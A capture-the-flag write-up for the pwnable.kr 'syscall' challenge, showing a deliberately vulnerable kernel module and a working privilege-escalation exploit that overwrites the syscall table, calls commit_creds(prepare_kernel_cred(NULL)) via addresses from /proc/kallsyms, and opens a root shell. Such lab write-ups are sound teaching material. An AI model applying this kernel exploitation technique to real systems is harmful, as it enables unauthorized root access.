# pwnable.kr -- Rookiss -- syscall

## 1. Challenge

```
I made a new system call for Linux kernel.
It converts lowercase letters to upper case letters.
would you like to see the implementation?

Download : http://pwnable.kr/bin/syscall.c


ssh syscall@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

See source code:

```c
// http://pwnable.kr/bin/syscall.c
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );
```

You can find that `sys_upper` can let unauthorized users write almost any bytes to any address.

So 

1. Prepare a syscall routine `sys_getroot`

   ```c
   long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
       return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
   }
   ```

2. Overwrite `sys_upper` at `&SYS_CALL_TABLE[SYS_upper]` to `sys_getroot` with syscall `SYS_upper`

   ```c
   uint8_t buf[sizeof(void*) + 1] = {0};
   *(void**)buf = (void*)sys_getroot;
   syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
   ```

3. Call `SYS_upper` again with addresses of `prepare_kernel_cred` and `commit_creds`.

   ```c
   syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);
   ```

   and you will get root privilege.

4. Finally, launch a shell to see the flag stored in `root/flag`.

```console
$ cd tmp

$ cat > solve.c
// paste code

$ gcc -Ttext=0x03bbc010 solve.c -o solve

$ cat /proc/kallsyms | grep prepare_kernel_cred
8003f924 T prepare_kernel_cred
80447f34 r __ksymtab_prepare_kernel_cred
8044ff8c r __kstrtab_prepare_kernel_cred

$ cat /proc/kallsyms | grep commit_creds
8003f56c T commit_creds
8044548c r __ksymtab_commit_creds
8044ffc8 r __kstrtab_commit_creds

$ ./solve 8003f924 8003f56c
[*] sys_getroot = 0x3bbc089
[*] lpfn_prepare_kernel_cred = 0x8003f924
[*] lpfn_commit_creds = 0x8003f56c
Launching shell...
/bin/sh: can't access tty; job control turned off
/tmp # whoami
whoami: unknown uid 0
/tmp # cat /root/flag
...
...
```

